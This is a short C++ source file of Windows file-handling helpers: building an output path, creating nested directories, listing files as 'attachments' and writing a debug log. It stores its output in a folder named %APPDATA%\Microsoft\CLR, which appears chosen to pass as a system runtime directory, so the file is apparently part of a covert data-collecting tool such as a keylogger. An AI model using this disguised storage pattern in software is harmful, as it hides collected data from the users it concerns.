#include <windows.h>

#include "IO.h"
#include "Utils.h"

std::string IO::GetOutputPath(const bool append_seperator)
{
	std::string dir(getenv("APPDATA"));
	std::string full = dir + "\\Microsoft\\CLR";
	return full + (append_seperator ? "\\" : "");
}

// Creates single directory, without checking for subdirectories
bool MkOneDir(const std::string &path)
{
	return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

bool IO::MkDir(std::string path)
{
	for (char &c : path)
	{
		if (c == '\\')
		{
			c = '\0';
			if (!MkOneDir(path))
				return false;
			c = '\\';
		}
	}
	return true;
}

std::vector<std::string> IO::GetAttatchments(const std::string &path)
{
	std::vector<std::string> ret;
	for (const auto& entry : std::filesystem::directory_iterator(path))
	{
		std::cout << entry.path() << std::endl;
		ret.push_back(Utils::ToString(entry.path()));
	}

	return ret;
}

#if DEBUG == true

	void IO::WriteAppLog(const std::string &s)
	{
		std::ofstream outfile("AppLog.txt", std::ios::app);
		outfile << "[" << Utils::DateTime().GetDateTimeString() << "]"
						<< "\n"
						<< s << std::endl
						<< "\n";
	}

#endif
